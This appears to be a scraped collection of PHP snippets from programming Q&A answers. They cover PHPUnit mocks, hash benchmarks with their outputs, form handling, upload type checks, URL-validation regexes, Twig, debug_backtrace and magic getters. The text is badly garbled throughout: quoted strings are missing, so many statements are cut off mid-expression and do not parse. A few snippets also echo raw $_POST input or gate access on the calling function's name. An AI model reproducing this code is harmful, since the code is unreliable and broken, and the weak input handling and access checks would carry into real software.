class stdClass { public function __construct(array $arguments = array()) { if (!empty($arguments)) { foreach ($arguments as $property => $argument) { if(is_numeric($property)): $this->{$argument} = null; else: $this->{$property} = $argument; endif; } } } public function __call($method, $arguments) { $arguments = array_merge(array("stdObject" => $this), $arguments); if (isset($this->{$method}) && is_callable($this->{$method})) { return call_user_func_array($this->{$method}, $arguments); } else { throw new Exception("Fatal error: Call to undefined method stdObject::{$method}()"); } } public function __get($name){ if(property_exists($this, $name)): return $this->{$name}; else: return $this->{$name} = null; endif; } public function __set($name, $value) { $this->{$name} = $value; } } $obj1 = new stdClass([ echo $obj1->property1; echo $obj1->property2; $obj2 = new stdClass(); echo $obj2->property1;
$mock = $this->getMock( $mock->expects($this->any)) ->method( ->will($this->returnValue(
$mock = $this->getMock( $mock->expects($this->any)) ->method( ->with($this->equalTo( ->will($this->returnValue( $mock->expects($this->any)) ->method( ->with($this->equalTo( ->will($this->returnValue(
<?php class StubTest extends PHPUnit_Framework_TestCase { public function testReturnCallbackStub() { $stub = $this->getMock( ); $stub->expects($this->any()) ->method( ->will($this->returnCallback( } } function callback() { $args = func_get_args(); } ?>
$mock->expects($this->any()) ->method( ->will( $this->returnValueMap( array( array( array( ) ) );
$mock = $this->getMock(); $mock->expects($this->at(0)) ->method( ->with(...) ->will($this->returnValue(...)); $mock->expects($this->at(1)) ->method( ->with(...) ->will($this->returnValue(...));
<?php class StubTest extends PHPUnit_Framework_TestCase { public function testReturnAction() { $object = $this->getMock( $object->expects($this->any()) ->method( ->will($this->returnCallback(array($this, $object->returnAction( $object->returnAction( } public function returnCallback() { $args = func_get_args(); return } } ?>
$mock->expects( $this->any() ) ) ->method( ->will( $this->onConsecutiveCalls(
$stub = $this->getMock( ); $stub->expects($this->any()) ->method( ->will($this->returnArgument(0));
public function TestSomeCondition($condition){ $mockObj = $this->getMockObject(); $mockObj->setReturnValue( }
$this->BusinessMock = $this->createMock( public function testBusiness() { $this->BusinessMock ->method( ->will($this->onConsecutiveCalls( $this->returnArgument(0), $this->returnValue( ) ); $this->assertInstanceOf( $this->BusinessMock->getEmployees() ); $this->assertEquals( }
fcn time generated hash crc32: 0.03163 798740135 md5: 0.0731 0dbab6d0c841278d33be207f14eeab8b sha1: 0.07331 417a9e5c9ac7c52e32727cfd25da99eca9339a80 xor: 0.65218 119 xor2: 0.29301 134217728 add: 0.57841 1105
$loops = 100000; $str = "ana are mere"; echo "<pre>"; $tss = microtime(true); for($i=0; $i<$loops; $i++){ $x = crc32($str); } $tse = microtime(true); echo "\ncrc32: \t" . round($tse-$tss, 5) . " \t" . $x; $tss = microtime(true); for($i=0; $i<$loops; $i++){ $x = md5($str); } $tse = microtime(true); echo "\nmd5: \t".round($tse-$tss, 5) . " \t" . $x; $tss = microtime(true); for($i=0; $i<$loops; $i++){ $x = sha1($str); } $tse = microtime(true); echo "\nsha1: \t".round($tse-$tss, 5) . " \t" . $x; $tss = microtime(true); for($i=0; $i<$loops; $i++){ $l = strlen($str); $x = 0x77; for($j=0;$j<$l;$j++){ $x = $x xor ord($str[$j]); } } $tse = microtime(true); echo "\nxor: \t".round($tse-$tss, 5) . " \t" . $x; $tss = microtime(true); for($i=0; $i<$loops; $i++){ $l = strlen($str); $x = 0x08; for($j=0;$j<$l;$j++){ $x = ($x<<2) xor $str[$j]; } } $tse = microtime(true); echo "\nxor2: \t".round($tse-$tss, 5) . " \t" . $x; $tss = microtime(true); for($i=0; $i<$loops; $i++){ $l = strlen($str); $x = 0; for($j=0;$j<$l;$j++){ $x = $x + ord($str[$j]); } } $tse = microtime(true); echo "\nadd: \t".round($tse-$tss, 5) . " \t" . $x;
<?php set_time_limit(720); $begin = startTime(); $scores = array(); foreach(hash_algos() as $algo) { $scores[$algo] = 0; } for($i=0;$i<10000;$i++) { $number = rand()*100000000000000; $string = randomString(500); foreach(hash_algos() as $algo) { $start = startTime(); hash($algo, $number); hash($algo, $string); $end = endTime($start); $scores[$algo] += $end; } } asort($scores); $i=1; foreach($scores as $alg => $time) { print $i. $i++; } echo "Entire page took ".endTime($begin). echo "<br /><br /><h2>Hashes Compared</h2>"; foreach($scores as $alg => $time) { print $i. $i++; } function startTime() { $mtime = microtime(); $mtime = explode(" ",$mtime); $mtime = $mtime[1] + $mtime[0]; return $mtime; } function endTime($starttime) { $mtime = microtime(); $mtime = explode(" ",$mtime); $mtime = $mtime[1] + $mtime[0]; $endtime = $mtime; return $totaltime = ($endtime - $starttime); } function randomString($length) { $characters = $string = for ($p = 0; $p < $length; $p++) { $string .= $characters[mt_rand(0, strlen($characters) - 1)]; } return $string; } ?>
1 - crc32b 0.111036300659 2 - crc32 0.112048864365 3 - md4 0.120795726776 4 - md5 0.138875722885 5 - sha1 0.146368741989 6 - adler32 0.15501332283 7 - tiger192,3 0.177447080612 8 - tiger160,3 0.179498195648 9 - tiger128,3 0.184012889862 10 - ripemd128 0.184052705765 11 - ripemd256 0.185411214828 12 - salsa20 0.198500156403 13 - salsa10 0.204956293106 14 - haval160,3 0.206098556519 15 - haval256,3 0.206891775131 16 - haval224,3 0.206954240799 17 - ripemd160 0.207638263702 18 - tiger192,4 0.208125829697 19 - tiger160,4 0.208438634872 20 - tiger128,4 0.209359407425 21 - haval128,3 0.210256814957 22 - sha256 0.212738037109 23 - ripemd320 0.215386390686 24 - haval192,3 0.215610980988 25 - sha224 0.218329429626 26 - haval192,4 0.256464719772 27 - haval160,4 0.256565093994 28 - haval128,4 0.257113456726 29 - haval224,4 0.258928537369 30 - haval256,4 0.259262084961 31 - haval192,5 0.288433790207 32 - haval160,5 0.290239810944 33 - haval256,5 0.291721343994 34 - haval224,5 0.294484138489 35 - haval128,5 0.300224781036 36 - sha384 0.352449893951 37 - sha512 0.354603528976 38 - gost 0.392376661301 39 - whirlpool 0.629067659378 40 - snefru256 0.829529047012 41 - snefru 0.833986997604 42 - md2 1.80192279816 Entire page took 22.755341053 seconds Hashes Compared 1 - crc32b 761331d7 2 - crc32 7e8c6d34 3 - md4 1bc8785de173e77ef28a24bd525beb68 4 - md5 9f9cfa3b5b339773b8d6dd77bbe931dd 5 - sha1 ca2bd798e47eab85655f0ce03fa46b2e6e20a31f 6 - adler32 f5f2aefc 7 - tiger192,3 d11b7615af06779259b29446948389c31d896dee25edfc50 8 - tiger160,3 d11b7615af06779259b29446948389c31d896dee 9 - tiger128,3 d11b7615af06779259b29446948389c3 10 - ripemd128 5f221a4574a072bc71518d150ae907c8 11 - ripemd256 bc89cd79f4e70b73fbb4faaf47a3caf263baa07e72dd435a0f62afe840f5c71c 12 - salsa20 91d9b963e172988a8fc2c5ff1a8d67073b2c5a09573cb03e901615dc1ea5162640f607e0d7134c981eedb761934cd8200fe90642a4608eacb82143e6e7b822c4 13 - salsa10 320b8cb8498d590ca2ec552008f1e55486116257a1e933d10d35c85a967f4a89c52158f755f775cd0b147ec64cde8934bae1e13bea81b8a4a55ac2c08efff4ce 14 - haval160,3 27ad6dd290161b883e614015b574b109233c7c0e 15 - haval256,3 03706dd2be7b1888bf9f3b151145b009859a720e3fe921a575e11be801c54c9a 16 - haval224,3 16706dd2c77b1888c29f3b151745b009879a720e4fe921a576e11be8 17 - ripemd160 f419c7c997a10aaf2d83a5fa03c58350d9f9d2e4 18 - tiger192,4 112f486d3a9000f822c050a204d284d52473f267b1247dbd 19 - tiger160,4 112f486d3a9000f822c050a204d284d52473f267 20 - tiger128,4 112f486d3a9000f822c050a204d284d5 21 - haval128,3 9d9155d430218e4dcdde1c62962ecca3 22 - sha256 6027f87b4dd4c732758aa52049257f9e9db7244f78c132d36d47f9033b5c3b09 23 - ripemd320 9ac00db553b51662826267daced37abfccca6433844f67d8f8cfd243cf78bbbf86839daf0961b61d 24 - haval192,3 7d706dd2d37c1888eaa53b154948b009e09c720effed21a5 25 - sha224 b6395266d8c7e40edde77969359e6a5d725f322e2ea4bd73d3d25768 26 - haval192,4 d87cd76e4c8006d401d7068dce5dec3d02dfa037d196ea14 27 - haval160,4 f2ddd76e156d0cd40eec0b8d09c8f23d0f47a437 28 - haval128,4 f066e6312b91e7ef69f26b2adbeba875 29 - haval224,4 1b7cd76ea97c06d439d6068d7d56ec3d73dba0373895ea14e465bc0e 30 - haval256,4 157cd76e8b7c06d432d6068d7556ec3d66dba0371c95ea14e165bc0ec31b9d37 31 - haval192,5 05f9ea219ae1b98ba33bac6b37ccfe2f248511046c80c2f0 32 - haval160,5 e054ec218637bc8b4bf1b26b2fb40230e0161904 33 - haval256,5 48f6ea210ee1b98be835ac6b7dc4fe2f39841104a37cc2f06ceb2bf58ab4fe78 34 - haval224,5 57f6ea2111e1b98bf735ac6b92c4fe2f43841104ab7cc2f076eb2bf5 35 - haval128,5 ccb8e0ac1fd12640ecd8976ab6402aa8 36 - sha384 bcf0eeaa1479bf6bef7ece0f5d7111c3aeee177aa7990926c633891464534cd8a6c69d905c36e882b3350ef40816ed02 37 - sha512 8def9a1e6e31423ef73c94251d7553f6fe3ed262c44e852bdb43e3e2a2b76254b4da5ef25aefb32aae260bb386cd133045adfa2024b067c2990b60d6f014e039 38 - gost ef6cb990b754b1d6a428f6bb5c113ee22cc9533558d203161441933d86e3b6f8 39 - whirlpool 54eb1d0667b6fdf97c01e005ac1febfacf8704da55c70f10f812b34cd9d45528b60d20f08765ced0ab3086d2bde312259aebf15d105318ae76995c4cf9a1e981 40 - snefru256 20849cbeda5ddec5043c09d36b2de4ba0ea9296b6c9efaa7c7257f30f351aea4 41 - snefru 20849cbeda5ddec5043c09d36b2de4ba0ea9296b6c9efaa7c7257f30f351aea4 42 - md2 d4864c8c95786480d1cf821f690753dc
Name Speed Q.Score Author xxHash 5.4 GB/s 10 MumurHash 3a 2.7 GB/s 10 Austin Appleby SpookyHash 2.0 GB/s 10 Bob Jenkins SBox 1.4 GB/s 9 Bret Mulvey Lookup3 1.2 GB/s 9 Bob Jenkins CityHash64 1.05 GB/s 10 Pike & Alakuijala FNV 0.55 GB/s 5 Fowler, Noll, Vo CRC32 0.43 GB/s 9 MD5-32 0.33 GB/s 10 Ronald L. Rivest SHA1-32 0.28 GB/s 10
+-------------------+---------+------+--------------+ | NAME | LOOPS | TIME | OP/S | +-------------------+---------+------+--------------+ | sha1ShortString | 1638400 | 2.85 | 574,877.19 | | md5ShortString | 2777680 | 4.11 | 675,834.55 | | crc32ShortString | 3847980 | 3.61 | 1,065,922.44 | | sha1MediumString | 602620 | 4.75 | 126,867.37 | | md5MediumString | 884860 | 4.69 | 188,669.51 | | crc32MediumString | 819200 | 4.85 | 168,907.22 | | sha1LongString | 181800 | 4.95 | 36,727.27 | | md5LongString | 281680 | 4.93 | 57,135.90 | | crc32LongString | 226220 | 4.95 | 45,701.01 | +-------------------+---------+------+--------------+
echo $run = array(); function test($algo) { $tss = microtime(true); for($i=0; $i<100000; $i++){ $x = hash($algo, "ana are mere"); } $tse = microtime(true); $GLOBALS[ } array_map( ksort($run); print_r($run); echo
<!DOCTYPE html PUBLIC"- "http: <html xmlns="http: <head> <meta http-equiv="content-type" content="text/html; charset=utf-8" /> <title>insert page</title></head> <body> <h1> Insert Page </h1> <form action="insert.php" method="post" enctype="application/x-www-form-urlencoded" > <p>Title:<input type="text" name="title" size="40"/></p> <p>Price:<input type= "text" name="price" size="40" /></p> <p><input type="submit" value="Insert" /> <input type="reset" value="Reset" /></p> </form> </body> </html>
<?php $title = $_POST["title"]; $price = $_POST["price"]; echo $title; ?>
<meta content="text/html;charset=utf-8" http-equiv="Content-Type"> <meta content="utf-8" http-equiv="encoding">
<!DOCTYPE html PUBLIC"- "http: <html xmlns="http: <head> <meta http-equiv="content-type" content="text/html; charset=utf-8" /> <title>insert page</title></head> <body> <?php $title = $_POST["title"]; $price = $_POST["price"]; echo $title; ?> </body> </html>
<?php $title = $_POST["title"]; $price = $_POST["price"]; echo echo echo echo echo $title; echo echo echo echo echo ?>
.rar application/x-rar-compressed, application/octet-stream .zip application/zip, application/octet-stream, application/x-zip-compressed, multipart/x-zip
<?php if (isRarOrZip($argv[1])) { echo } else { echo } function isRarOrZip($file) { $bytes = file_get_contents($file, FALSE, NULL, 0, 7); $ext = strtolower(substr($file, - 4)); if ($ext == return TRUE; } if ($ext == return TRUE; } return FALSE; }
$ rar.exe l somefile.zip somefile.zip is not RAR archive
$fileInfo = new finfo(FILEINFO_MIME_TYPE); $fileMime = $fileInfo->file($_FILES[ $validMimes = array( ); $fileExt = array_search($fileMime, $validMimes, true); if($fileExt != throw new RuntimeException(
import Foundation import MobileCoreServices extension URL { var mimeType: String? { guard self.pathExtension.count != 0 else { return nil } let pathExtension = self.pathExtension as CFString if let preferredIdentifier = UTTypeCreatePreferredIdentifierForTag(kUTTagClassFilenameExtension, pathExtension, nil) { guard let mimeType = UTTypeCopyPreferredTagWithClass(preferredIdentifier.takeRetainedValue(), kUTTagClassMIMEType) else { return nil } return mimeType.takeRetainedValue() as String } return nil } }
$allowedExtensions = array( $temp = explode(".", $_FILES[$file]["name"]); $extension = strtolower(end($temp)); if( in_array( $extension, $allowedExtensions ) ) {
<?php abstract class MyFoo implements iMyFoo { public static final function factory($type, $someData) { $class = get_called_class()."_".$type; $inst = $class::getInstance($someData); return $inst; } } interface iMyFoo { static function factory($type, $someData); static function getInstance(); function getSomeData(); } ?>
<?php abstract class ParentClass { static function foo() { echo "I self::bar(); } abstract static function bar(); } class ChildClass extends ParentClass { static function bar() { echo "Hello, World!"; } } ChildClass::foo();
abstract class cA { static function A(){static::B();} abstract static function B(); } class cB extends cA { static function B(){echo "ok";} } cB::A();
abstract class cA { static function A(){static::B();} abstract static function B(); } class cB extends cA { static function B(){echo "ok";} } cB::A();
trait StaticExample { public static function instance () { return new self; } }
function parse_xml_into_array($xml_string, $options = array()) { if (preg_match_all("|</([\\w\\-]+):([\\w\\-]+)>|", $xml_string, $matches, PREG_SET_ORDER)) { foreach ($matches as $match) { $xml_string = str_replace( $xml_string = str_replace( } } $output = json_decode(json_encode(@simplexml_load_string($xml_string, if ($options[ $bool = function(&$item, $key) { if (in_array($item, array( $item = true; } elseif (in_array($item, array( $item = false; } }; array_walk_recursive($output, $bool); } return $output; }
$xslt = $dom = new DOMDocument; $dom->loadXML(' <states x-x=\ <state y="123">Alabama</state> My name is <b>John</b> Doe <state>Alaska</state> </states> if (!$dom) die("\nERROR!"); $xslDoc = new DOMDocument(); $xslDoc->load($xslt); $proc = new XSLTProcessor(); $proc->importStylesheet($xslDoc); echo $proc->transformToXML($dom);
zend_extension = "d:/wamp/bin/php/php5.3.8/zend_ext/php_xdebug-2.1.2-5.3-vc9.dll
$queue = array( while (count($queue)) { $url = array_shift($queue); $queue = array_merge($queue, find_urls($url)); } function find_urls($url) { $urls = array(); return $urls; }
xdebug.remote_enable=on xdebug.remote_handler=dbgp xdebug.remote_host=localhost xdebug.remote_port=9000 xdebug.profiler_enable=0 xdebug.profiler_enable_trigger=1 xdebug.profiler_output_dir=/home/drupalpro/websites/logs/profiler xdebug.max_nesting_level=300
class PaymentService { private $CI; public function __construct() { $this->CI =& get_instance(); } public function process(){ }
$results .= . . smarty_modifier_debug_print_var($curr_val, ++$depth, $length);
$max_depth = 10; $results .= . . ($depth > $max_depth ?
function url_exist($url){ $c=curl_init(); curl_setopt($c,CURLOPT_URL,$url); curl_setopt($c,CURLOPT_HEADER,1); curl_setopt($c,CURLOPT_NOBODY,1); curl_setopt($c,CURLOPT_RETURNTRANSFER,1); curl_setopt($c,CURLOPT_FRESH_CONNECT,1); if(!curl_exec($c)){ return false; }else{ return true; } }
(?xi) \b ( (?: https?: | www\d{0,3}[.] | [a-z0-9.\-]+[.][a-z]{2,4}/ ) (?: [^\s()<>]+ | \(([^\s()<>]+|(\([^\s()<>]+\)))*\) )+ (?: \(([^\s()<>]+|(\([^\s()<>]+\)))*\) | [^\s`!()\[\]{};: ) )
function validateURL($URL) { $pattern_1 = "/^(http|https|ftp):\/\/(([A-Z0-9][A-Z0-9_-]*)(\.[A-Z0-9][A-Z0-9_-]*)+.(com|org|net|dk|at|us|tv|info|uk|co.uk|biz|se)$)(:(\d+))?\/?/i"; $pattern_2 = "/^(www)((\.[A-Z0-9][A-Z0-9_-]*)+.(com|org|net|dk|at|us|tv|info|uk|co.uk|biz|se)$)(:(\d+))?\/?/i"; if(preg_match($pattern_1, $URL) || preg_match($pattern_2, $URL)){ return true; } else{ return false; } }
$pattern = "/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&@
function link_validate_url($text) { $LINK_DOMAINS = $LINK_ICHARS_DOMAIN = (string) html_entity_decode(implode("", array( "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& "& )), ENT_QUOTES, $LINK_ICHARS = $LINK_ICHARS_DOMAIN . (string) html_entity_decode(implode("", array( "& )), ENT_QUOTES, $allowed_protocols = array( $protocol = $authentication = "(?:(?:(?:[\w\.\-\+!$& $domain = $ipv4 = $ipv6 = $port = $external_pattern = $internal_pattern = "/^(?:[a-z0-9". $LINK_ICHARS ."_\-+\[\]]+)"; $internal_pattern_file = "/^(?:[a-z0-9". $LINK_ICHARS ."_\-+\[\]\.]+)$/i"; $directories = "(?:\/[a-z0-9". $LINK_ICHARS ."_\-\.~+%=&,$ $query = "(?:\/?\?([?a-z0-9". $LINK_ICHARS ."+_|\-\.~\/\\\\%=&,$ $anchor = "(?: $end = $directories . $message_id = $newsgroup_name = $news_pattern = $user = $email_pattern = if (strpos($text, return false; } if (in_array( return false; } if (in_array( return false; } if (preg_match($internal_pattern . $end, $text)) { return false; } if (preg_match($external_pattern . $end, $text)) { return false; } if (preg_match($internal_pattern_file, $text)) { return false; } return true; }
function isURL($url = NULL) { if($url==NULL) return false; $protocol = $allowed = $regex = "^". $protocol . if(eregi($regex, $url)==true) return true; else return false; }
function is_valid_url ($url="") { if ($url=="") { $url=$this->url; } $url = @parse_url($url); if ( ! $url) { return false; } $url = array_map( $url[ $path = (isset($url[ if ($path == $path = } $path .= ( isset ( $url[ if ( isset ( $url[ if ( PHP_VERSION >= 5 ) { $headers = get_headers("$url[scheme]: } else { $fp = fsockopen($url[ if ( ! $fp ) { return false; } fputs($fp, "HEAD $path HTTP/1.1\r\nHost: $url[host]\r\n\r\n"); $headers = fread ( $fp, 128 ); fclose ( $fp ); } $headers = ( is_array ( $headers ) ) ? implode ( "\n", $headers ) : $headers; return ( bool ) preg_match ( } return false; }
if( ! preg_match( "/^([a-z][a-z0-9+.-]*):(?:\\/\\/((?:(?=((?:[a-z0-9-._~!$& { throw new \RuntimeException( "URI has not a valid format." ); }
<?php declare( strict_types = 1 ); namespace XaviMontero\ThrasherPortage\Tests\Tour; use XaviMontero\ThrasherPortage\Tour\Uri; class UriTest extends \PHPUnit_Framework_TestCase { private $sut; public function testCreationIsOfProperClassWhenUriIsValid() { $sut = new Uri( $this->assertInstanceOf( } /** * @dataProvider urlIsValidProvider * @dataProvider urnIsValidProvider */ public function testGetUriAsStringWhenUriIsValid( string $uri ) { $sut = new Uri( $uri ); $actual = $sut->getUriAsString(); $this->assertInternalType( $this->assertEquals( $uri, $actual ); } public function urlIsValidProvider() { return [ [ [ [ [ [ [ [ [ [ [ [ [ ]; } public function urnIsValidProvider() { return [ [ [ [ [ [ [ ]; } /** * @dataProvider urlIsNotValidProvider * @dataProvider urnIsNotValidProvider */ public function testCreationThrowsExceptionWhenUriIsNotValid( string $uri ) { $this->expectException( $this->sut = new Uri( $uri ); } public function urlIsNotValidProvider() { return [ [ [ [ [ [ [ [ [ [ [ [ ]; } public function urnIsNotValidProvider() { return [ [ [ [ [ [ ]; } }
<?php declare( strict_types = 1 ); namespace XaviMontero\ThrasherPortage\Tour; class Uri { /** @var string */ private $uri; public function __construct( string $uri ) { $this->assertUriIsCorrect( $uri ); $this->uri = $uri; } public function getUriAsString() { return $this->uri; } private function assertUriIsCorrect( string $uri ) { if( ! preg_match( "/^([a-z][a-z0-9+.-]*):(?:\\/\\/((?:(?=((?:[a-z0-9-._~!$& { throw new \RuntimeException( "URI has not a valid format." ); } } }
xavi@bromo:~/custom_www/hello-trip/mutant-migrant$ vendor/bin/phpunit PHPUnit 5.7.3 by Sebastian Bergmann and contributors. .............................................. 46 / 46 (100%) Time: 82 ms, Memory: 4.00MB OK (46 tests, 65 assertions)
function is_valid_url($url) { $_domain_regex = "|^[A-Za-z0-9-]+(\.[A-Za-z0-9-]+)*(\.[A-Za-z]{2,})/?$|"; if (preg_match($_domain_regex, $url)) { return true; } $_regex = if (preg_match($_regex, $url, $matches)) { $_parts = parse_url($url); if (!in_array($_parts[ return false; if (!preg_match($_domain_regex, $_parts[ return false; return true; } return false; }
var_dump(is_valid_url( var_dump(is_valid_url( var_dump(is_valid_url( var_dump(is_valid_url( var_dump(is_valid_url(
$pattern = " $text = preg_replace_callback($pattern,function($m){ return "<a href=\"$m[1]\" target=\"_blank\">$m[1]</a>$m[4]"; }, $text);
$urlArray = [ foreach ($urlArray as $k=>$v) { echo var_dump($urlVal->domain($v)) . }
bool(false) URL: http: bool(true) URL: https: bool(true) URL: https:
^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?$
$url = if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) { } else { }
"/(http(s?):\/\/)([a-z0-9\-]+\.)+[a-z]{2,4}(\.[a-z]{2,4})*(\/[^ ]+)*/i"
2.1 (+) means the character can be one or more ex: a1w, a9-,c559s, f) 2.2 \. is (.)sign 2.3. the (+) sign after ([a-z0-9\-]+\.) mean do 2.1,2.2,2.3 at least 1 time ex: abc.defgh0.ig, aa.b.ced.f.gh. also in case www.yyy.com 3.[a-z]{2,4} mean a-z at least 2 character but not more than 4 characters for check that there will not be the case ex: https: 4.(\.[a-z]{2,4})*(\/[^ ]+)* mean 4.1 \.[a-z]{2,4} means like number 3 but start with (.)sign 4.2 * means (\.[a-z]{2,4})can be use or not use never mind 4.3 \/ means \ 4.4 [^ ] means any character except blank 4.5 (+) means do 4.3,4.4,4.5 at least 1 times 4.6 (*) after (\/[^ ]+) mean use 4.3 - 4.5 or not use no problem use for case https: 5. when you use regex write in "/ /" so it come
6. almost forgot: letter i on the back mean ignore case of Big letter or small letter ex: A same as a, SoRRy same as sorry.
{% for group in user.groups %} {% set foo={ {% set title={ {{ title }} {% else %} {% set foo={ {% set title={ {% endfor %} {{ title }}
{% set links = {} %} { {% for item in items %} {% set links = links|merge({ (loop.index0) : { {% endfor %} {% set linkList = { } %} {% include
{% for key , value in t%} {% set temp= temp|merge({(key~ {% endfor %}
$function = new Twig_Function( if (!is_array($data)) { return $data; } $data[$key] = $value; return $data; }); $twig->addFunction($function);
$trace = debug_backtrace(); $caller = $trace[1]; echo "Called by {$caller[ if (isset($caller[ echo " in {$caller[
<?php Class MyClass { function __construct(){ $this->callee(); } function callee() { echo sprintf("callee() called @ %s: %s from %s::%s", xdebug_call_file(), xdebug_call_line(), xdebug_call_class(), xdebug_call_function() ); } } $rollDebug = new MyClass(); ?>
callee() called @ /var/www/xd.php: 16 from MyClass::__construct
public function getCallingFunctionName($completeTrace=false) { $trace=debug_backtrace(); if($completeTrace) { $str = foreach($trace as $caller) { $str .= " -- Called by {$caller[ if (isset($caller[ $str .= " From Class {$caller[ } } else { $caller=$trace[2]; $str = "Called by {$caller[ if (isset($caller[ $str .= " From Class {$caller[ } return $str; }
/** * Gets the caller of the function where this function is called from * @param string what to return? (Leave empty to get all, or specify: "class", "function", "line", "class", etc.) - options see: http: */ function getCaller($what = NULL) { $trace = debug_backtrace(); $previousCall = $trace[2]; if(isset($what)) { return $previousCall[$what]; } else { return $previousCall; } }
echo debug_backtrace( DEBUG_BACKTRACE_IGNORE_ARGS, 2)[1][
class basicFunctions{ public function getCallerFunction(){ return debug_backtrace( DEBUG_BACKTRACE_IGNORE_ARGS, 3)[2][ } }
function a($authorisedFunctionsList = array("b")){ $ref = new basicFunctions; $caller = $ref->getCallerFunction(); if(in_array($caller,$authorisedFunctionsList)): echo "Welcome!"; return true; else: echo "Unauthorised caller!"; return false; endif; } function b(){ $executionContinues = $this->a(); $executionContinues or exit; }
Warning: session_start() [function.session-start]: Cannot send session cache limiter - headers already sent (output started at ............ on line 23
<?php session_start(); if(isset($_SESSION[ { $user = $_SESSION[ echo "$user"; } else { } ?>
$path = "/path/to/file"; echo "Path : $path"; require "$path";
require_once __DIR__."/../config.php"; ... require_once SITE_ROOT."/other/file.php";
set_include_path(get_include_path().":"."/path/to/new/folder");
$user = posix_getpwuid(posix_geteuid()); var_dump($user);
require "/usr/share/php/libzend-framework-php/Zend/Mail/Protocol/Imap.php"
semanage fcontext -a -t httpd_sys_content_t "/path/to/root(/.*)?" restorecon -Rv /path/to/root
<Directory /var/www/vhosts/domain.com> <IfModule mod_php5.c> php_admin_flag engine on php_admin_flag safe_mode off php_admin_value open_basedir "/var/www/vhosts/domain.com:/tmp:/usr/share/pear:/local/PEAR" </IfModule> </Directory>
$document_root = $_SERVER[ echo "root: $document_root"; include($document_root.
array(4) { [0]=> string(0) "" [1]=> bool(false) [2]=> int(42) [3]=> array(1) {[0]=>string(2) "42")} }
Array ( [0] => [1] => [2] => 42 [3] => Array ([0] => 42) )
array ( 0 => 2 => false, 2 => 42, 3 => array (0 => )
class Entity { const TYPE_PERSON = 0; const TYPE_COMPANY = 1; }
namespace MyNamespace; class MyClass { const MY_CONSTANT = const MY_CONSTANT2 = }
class MyClassExtension extends \Twig_Extension { public function getName() { return } public function getGlobals() { $class = new \ReflectionClass( $constants = $class->getConstants(); return array( ); } }
namespace AppBundle\Entity; class Post { const NUM_ITEMS = 10; }
for ($i = 0; $i < 5; $i++) { $something = $object->{ }
$Class = $Property = $List = array( $Object = new $Class(); echo $Object->$Property; echo $Object->{$List[0]};
function magic($obj, $var, $value = NULL) { if($value == NULL) { return $obj->$var; } else { $obj->$var = $value; } }
echo $this->CI->{$this->someClass}->{$this->someID};
<?php class Foo { public $Name; public function magic($member, $value = NULL) { if ($value != NULL) { if (!property_exists($this, $member)) { trigger_error( $member, E_USER_ERROR); return NULL; } $this->$member = $value; } else { if (!property_exists($this, $member)) { trigger_error( $member, E_USER_ERROR); return NULL; } return $this->$member; } } }; $f = new Foo(); $f->magic("Name", "Something"); echo $f->magic("Name") , "\n"; $f->magic("Fame", "Something"); echo $f->magic("Fame") , "\n"; ?>
/** * check if property is defined on this class or any of it * * @param $property * * @return bool */ private function getIfExist($property) { $value = null; $propertiesArray = get_object_vars($this); if(array_has($propertiesArray, $property)){ $value = $propertiesArray[$property]; } return $value; }
const CONFIG_FILE_PATH_PROPERTY = $configFilePath = $this->getIfExist(self::CONFIG_FILE_PATH_PROPERTY);
public function callModule($pathString, $delimiter = $pathArray = explode($delimiter, $pathString); $module = array_shift($pathArray); $property = array_pop($pathArray); if(count($pathArray) == 0){ return $this->{$module}->{$property}; } $tmp = $this->{$module}; foreach($pathArray as $deeper){ $tmp = $tmp->{$deeper}; } return $tmp->{$property}; }
$propertyString = getXMLAttribute( $propertyString = substr($propertyString, 1); $moduleCaller = new ModuleCaller(); echo $moduleCaller->callModule($propertyString);
$classname = "myclass"; $obj = new $classname($params); $variable_name = "my_member_variable"; $val = $obj->$variable_name; $func_name = "myFunction"; $val = $obj->$func_name($parameters);
$prefix = $str = if (substr($str, 0, strlen($prefix)) == $prefix) { $str = substr($str, strlen($prefix)); }
function remove_prefix($text, $prefix) { if(0 === strpos($text, $prefix)) $text = substr($text, strlen($prefix)). return $text; }
$array = explode("_", $string); if($array[0] == "bla") array_shift($array); $string = implode("_", $array);
$parts = explode($start, $full, 2); if ($parts[0] === $end = $parts[1]; } else { $fail = true; }
<?php $iters = 100000; $start = "/aaaaaaa/bbbbbbbbbb"; $full = "/aaaaaaa/bbbbbbbbbb/cccccccccc/dddddddddd/eeeeeeeeee"; $end = $fail = false; $t0 = microtime(true); for ($i = 0; $i < $iters; $i++) { if (strpos($full, $start) === 0) { $end = substr($full, strlen($start)); } else { $fail = true; } } $t = microtime(true) - $t0; printf("%16s : %f s\n", "strpos+strlen", $t); $t0 = microtime(true); for ($i = 0; $i < $iters; $i++) { $parts = explode($start, $full, 2); if ($parts[0] === $end = $parts[1]; } else { $fail = true; } } $t = microtime(true) - $t0; printf("%16s : %f s\n", "explode", $t);
$str = "bla_string_bla_bla_bla"; str_replace("bla_","",$str,1);
class MyClass { private $firstField; private $secondField; public function __get($property) { if (property_exists($this, $property)) { return $this->$property; } } public function __set($property, $value) { if (property_exists($this, $property)) { $this->$property = $value; } } } $myClass = new MyClass(); $myClass->firstField = "This is a foo line"; $myClass->secondField = "This is a bar line"; echo $myClass->firstField; echo $myClass->secondField;
class MyClass { private $firstField; private $secondField; public function getFirstField() { return $this->firstField; } public function setFirstField($firstField) { $this->firstField = $firstField; } public function getSecondField() { return $this->secondField; } public function setSecondField($secondField) { $this->secondField = $secondField; } } $myClass = new MyClass(); $myClass->setFirstField("This is a foo line"); $myClass->setSecondField("This is a bar line"); echo $myClass->getFirstField(); echo $myClass->getSecondField();
function getName() { return $this->_name; } .... echo $user->getName();
echo " Dear $user->firstName $user->lastName! Your purchase: $product->name $product->count x $product->price "
echo " Dear " . $user->getFirstName() . " " . $user->getLastName() . " Your purchase: " . $product->getName() . " " . $product->getCount() . " x " . $product->getPrice() . " ";
function __get($p) { $m = "get_$p"; if(method_exists($this, $m)) return $this->$m(); user_error("undefined property $p"); }
function get_accountBalance() { $result = <...complex stuff...> $this->accountBalance = $result; } .... echo $user->accountBalance; .... echo $user->accountBalance;
